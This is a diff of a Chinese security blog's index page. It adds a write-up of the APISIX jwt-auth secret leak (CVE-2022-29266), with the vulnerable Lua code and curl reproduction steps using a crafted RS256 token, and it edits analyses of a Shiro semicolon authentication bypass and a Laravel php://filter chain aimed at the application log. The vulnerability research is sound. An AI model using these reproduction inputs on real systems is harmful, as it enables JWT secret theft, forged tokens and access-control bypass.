@@ -135,6 +135,103 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-CVE-2022-29266" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/06/06/CVE-2022-29266/">CVE-2022-29266</a>
+    </h1>
+  
+
+        
+        <a href="/2022/06/06/CVE-2022-29266/" class="archive-article-date">
+  	<time datetime="2022-06-06T13:28:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h4><p>由于 APISIX 中的 jwt-auth 插件依赖于 lua-resty-jwt 库，而在 lua-resty-jwt 库返回的错误信息中可能会包含 JWT 的 sceret 值，因此对于开启了 jwt-auth 插件的 APISIX 存在 JWT sceret 的泄露，从而造成对 JWT 的伪造风险。</p>
+<h4 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h4><h5 id="APISIX"><a href="#APISIX" class="headerlink" title="APISIX"></a>APISIX</h5><p>Apache APISIX 是一个开源的云原生 API 网关，具有高性能、可扩展的特点，APISIX 是通过插件的形式来提供负载均衡、日志记录、身份鉴权、流量控制等功能。</p>
+<h5 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h5><p>JSON Web Token 缩写成 JWT，常被用于和服务器的认证场景中，这一点有点类似于 Cookie 里的 Session id。JWT 支持 HS256、RS256、RS512 等等算法，JWT 由三部分构成，分别为 Header（头部）、Payload（负载）、Signature（签名），三者以小数点分割。JWT 的第三部分 Signature 是对 Header 和 Payload 部分的签名，起到防止数据篡改的作用，如果知道了 Signature 内容，那么就可以伪造 JWT 了。</p>
+<p>JWT格式</p>
+<p><code>Header.payload.signature</code></p>
+<h4 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h4><p>根据官方补丁定位到漏洞点</p>
+<p><img src="C:\Users\人绮的Windows\AppData\Roaming\Typora\typora-user-images\image-20220606220156788.png" alt="image-20220606220156788"></p>
+<p>如果 JWT 无效则在 return 返回 401 并给出无效的原因，即 jwt_obj.reason。接着在 lua-resty-jwt 库中找到lib/resty/jwt.lua 文件，在 jwt.lua 文件的 782 行中，可以看到有个 jwt_obj.reason 中包含了 secret，这里代码的意思是说，如果程序执行正常就返回 secret 的值，否则就返回具体的异常信息。</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> cert <span class="keyword">then</span></span><br><span class="line">        jwt_obj[str_const.reason] = <span class="string">&quot;Decode secret is not a valid cert/public key: &quot;</span> .. (err <span class="keyword">and</span> err <span class="keyword">or</span> secret)</span><br><span class="line">        <span class="keyword">return</span> jwt_obj</span><br><span class="line">      <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>.. 表示字符串拼接，即把后面代码的值拼接到字符串中</p>
+<p>err and err or secret 所表示的意思是：如果 err 为 nil，则返回 secret 的值，否则返回 err</p>
+<p>如果能让代码执行到这一步，就可以得到secret。</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> alg == str_const.HS256 <span class="keyword">or</span> alg == str_const.HS512 <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">local</span> success, ret = <span class="built_in">pcall</span>(_M.sign, <span class="built_in">self</span>, secret, jwt_obj)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> success <span class="keyword">then</span></span><br><span class="line">    <span class="comment">-- syntax check</span></span><br><span class="line">    jwt_obj[str_const.reason] = ret[str_const.reason] <span class="keyword">or</span> str_const.internal_error</span><br><span class="line">  <span class="keyword">elseif</span> jwt_str ~= ret <span class="keyword">then</span></span><br><span class="line">    <span class="comment">-- signature check</span></span><br><span class="line">    jwt_obj[str_const.reason] = <span class="string">&quot;signature mismatch: &quot;</span> .. jwt_obj[str_const.signature]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">elseif</span> alg == str_const.RS256 <span class="keyword">or</span> alg == str_const.RS512 <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">local</span> cert, err</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">self</span>.trusted_certs_file ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> cert_str = extract_certificate(jwt_obj, <span class="built_in">self</span>.x5u_content_retriever)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cert_str <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">return</span> jwt_obj</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    cert, err = evp.Cert:new(cert_str)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cert <span class="keyword">then</span></span><br><span class="line">      jwt_obj[str_const.reason] = <span class="string">&quot;Unable to extract signing cert from JWT: &quot;</span> .. err</span><br><span class="line">      <span class="keyword">return</span> jwt_obj</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="comment">-- Try validating against trusted CA&#x27;s, then a cert passed as secret</span></span><br><span class="line">    <span class="keyword">local</span> trusted, err = cert:verify_trust(<span class="built_in">self</span>.trusted_certs_file)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> trusted <span class="keyword">then</span></span><br><span class="line">      jwt_obj[str_const.reason] = <span class="string">&quot;Cert used to sign the JWT isn&#x27;t trusted: &quot;</span> .. err</span><br><span class="line">      <span class="keyword">return</span> jwt_obj</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">elseif</span> secret ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> err</span><br><span class="line">    <span class="keyword">if</span> secret:<span class="built_in">find</span>(<span class="string">&quot;CERTIFICATE&quot;</span>) <span class="keyword">then</span></span><br><span class="line">      cert, err = evp.Cert:new(secret)</span><br><span class="line">    <span class="keyword">elseif</span> secret:<span class="built_in">find</span>(<span class="string">&quot;PUBLIC KEY&quot;</span>) <span class="keyword">then</span></span><br><span class="line">      cert, err = evp.PublicKey:new(secret)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cert <span class="keyword">then</span></span><br><span class="line">      jwt_obj[str_const.reason] = <span class="string">&quot;Decode secret is not a valid cert/public key: &quot;</span> .. (err <span class="keyword">and</span> err <span class="keyword">or</span> secret)</span><br><span class="line">      <span class="keyword">return</span> jwt_obj</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    jwt_obj[str_const.reason] = <span class="string">&quot;No trusted certs loaded&quot;</span></span><br><span class="line">    <span class="keyword">return</span> jwt_obj</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>要让代码执行到输出secret有4个条件</p>
+<ol>
+<li>JWT 的算法需要是 RS256 或者 RS512</li>
+<li>trusted_certs_file 值需要为 nil</li>
+<li>secret 值不能为 nil</li>
+<li>cert 的值需要为 nil 或者 false</li>
+</ol>
+<p>第一个条件容易满足可以在header的参数里改掉。第二个条件要求信任证书文件，APISIX 默认算法是 HS256，而 HS256 和 HS512 不支持这种证书文件的方式，因此只要我们使用 HS256  或者 HS512 算法。第三个条件，secret 值不能为 nil，当 APISIX 使用 jwt-auth 插件的时候，如果使用的默认算法，就需要指定 secret 的值，那么这个 secret 的值就不会是 nil 了。在 776 行至 779 行的代码中，可以看到会判断 secret 中有没有 CERTIFICATE 和 PUBLIC KEY，如果有那么 cert 就不会是 nil 了，那么也就是说，只要 secret 中没有 CERTIFICATE 和 PUBLIC KEY，代码就会执行到第 782 行，并且返回 secret 的值。</p>
+<h4 id="0x04-复现"><a href="#0x04-复现" class="headerlink" title="0x04 复现"></a>0x04 复现</h4><p>先计算一个RS256算法的JWT值作为payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg</span><br></pre></td></tr></table></figure>
+
+<p>创建一个 consumer 对象，并设置 jwt-auth 的值，默认是 HS256 算法，secret  值为 teamssix-secret-key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:9080/apisix/admin/consumers -H &#x27;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#x27; -X PUT -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">&quot;username&quot;: &quot;jack&quot;,</span><br><span class="line">&quot;plugins&quot;: &#123;</span><br><span class="line">&quot;jwt-auth&quot;: &#123;</span><br><span class="line">&quot;key&quot;: &quot;rs-key&quot;,</span><br><span class="line">&quot;secret&quot;: &quot;my-secret-key&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>再创建一个路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:9080/apisix/admin/routes/1 -H &#x27;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#x27; -X PUT -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">&quot;methods&quot;: [&quot;GET&quot;],</span><br><span class="line">&quot;uri&quot;: &quot;/index.html&quot;,</span><br><span class="line">&quot;plugins&quot;: &#123;</span><br><span class="line">&quot;jwt-auth&quot;: &#123;&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;upstream&quot;: &#123;</span><br><span class="line">&quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">&quot;nodes&quot;: &#123;</span><br><span class="line">&quot;0.0.0.0:80&quot;: 1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>发送刚刚构造好的JWT值即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:9080/index.html?jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/06/06/CVE-2022-29266/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-CVE-2020-13933" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -163,18 +260,25 @@
 <p><img src="https://github.com/jjzdxmd/src/blob/master/CVE-2020-13933/2.png?raw=true"></p>
 <p>%3b绕过</p>
 <p><img src="https://github.com/jjzdxmd/src/blob/master/CVE-2020-13933/exp.png?raw=true"></p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>本质原因是因为shiro和spring的处理方式不同<br>先来看shiro的处理。</p>
-<p>可以看到出问题的地方在org.apache.shiro.web.util.Webutils#getPathWithinApplication</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>本质原因是因为shiro和spring对uri的处理方式不同<br>先来看shiro的处理。</p>
+<p>shiro对于uri的处理在org.apache.shiro.web.util.Webutils#getPathWithinApplication</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> string <span class="title">getPathWithinApplication</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> normalize(removeSemicolon(getServletPath(request)+ getPathInfo(request)))&#125;;</span><br></pre></td></tr></table></figure>
-<p>首先获取到解码后的url，接着取出其中的路径，最后返回分号之前的路径,跟进removeSemicolon</p>
+<p>注意这里获取到的是解码后的url，也就是admin/;page接着取出其中的路径，最后返回分号之前的路径,跟进removeSemicolon</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">removeSemicolon</span><span class="params">(String uri)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> semicolonIndex=uri.index0f(<span class="number">59</span>);</span><br><span class="line"><span class="keyword">return</span> semicolonIndex!=-<span class="number">1</span>?uri.substring(<span class="number">0</span>,semicolonIndex):uri:</span><br></pre></td></tr></table></figure>
-<p>实际上，传入的/admin/page或者是/admin/;page最后都会变成/admin,在shiro看来这个当然是可以访问的页面，但/admin/后面的路由是需要验证的。<br>而spring的处理顺序不同，spring会先做removesemicolon，然后再decodeRequestString，getSanitizedPath</p>
+<p>这里把url中;以后的部分(包括;)全部去除然后返回给getPathWithinApplication，实际上，传入的/admin/;page最后会变成/admin,在shiro看来这个路径和源码中的路径是不匹配的。会移交给error处理，而error产生的错误页面是允许访问的，在这之后shiro的鉴权结束，uri处理将会交给spring的过滤器。<br>而spring的处理顺序不同，spring会先做removesemicolon，然后再decodeRequestString，getSanitizedPath</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> </span>&#123;</span><br><span class="line">    uri = <span class="keyword">this</span>.removeSemicolonContent(uri);</span><br><span class="line">    uri = <span class="keyword">this</span>.decodeRequestString(request, uri);</span><br><span class="line">    uri = <span class="keyword">this</span>.getSanitizedPath(uri);</span><br><span class="line">    <span class="keyword">return</span> uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 <ul>
 <li>removeSemicolonContent 是把（url未解码前的uri里的;后面的内容给删除）</li>
 <li>decodeRequestString 把uri进行urldecode解码</li>
 <li>getSanitizedPath 是把”//“ 替换成 “/“</li>
 </ul>
-<p>shiro正相反，先解码，再去分号。这就导致了shiro认为处理过后页面可以访问，但当真正的url传给spring的时候，spring把;page当成了name。从而导致了身份绕过。</p>
+<p>shiro正相反，先解码，再去分号。这就导致了shiro认为处理过后页面可以访问，但当真正的uri传给spring的时候，spring开始做路由匹配spring把;page当成了name。从而导致了身份绕过。</p>
+<p><img src="https://qiniu.ebounce.cn/blog/shirospring2.png?imageView2/0/q/75%7Cwatermark/2/text/QEVib3VuY2U=/font/5b6u6L2v6ZuF6buR/fontsize/460/fill/IzlFOTc5Nw==/dissolve/50/gravity/SouthEast/dx/10/dy/10%7Cimageslim"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/admin/&#123;name&#125;&quot;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;admin page&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://github.com/jjzdxmd/src/blob/master/CVE-2020-13933/3.png?raw=true"></p>
 <p>至此漏洞复现完成。</p>
 
@@ -268,7 +372,7 @@
 <p>问题又出现了，file_get_contents()传入\00的时候php会报一个Warning，同样会触发Debug页面的报错。所以还得想办法将空字节（\00）写入到log中。作者给出了给出了一个convert.quoted-printable-encode过滤器。原理就是将字符转成ascii后前面加个=号，将其打印出来。<br>而与之对应的convert.quoted-printable-decode过滤器，则是相反。<br>原理是将等于号后面的ascii字符解码后，打印出来。</p>
 <p>因此，我们上面做的工作就是找了一条链子base64编码，然后把链子再quoted-printable编码。</p>
 <p>总结就是下面这样</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=test.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure>
 
 <h4 id="踩坑："><a href="#踩坑：" class="headerlink" title="踩坑："></a>踩坑：</h4><ol>
 <li>由于payload在进行base64编码的时候，可能会出现==，而在quoted-printable解码的时候就会报错</li>
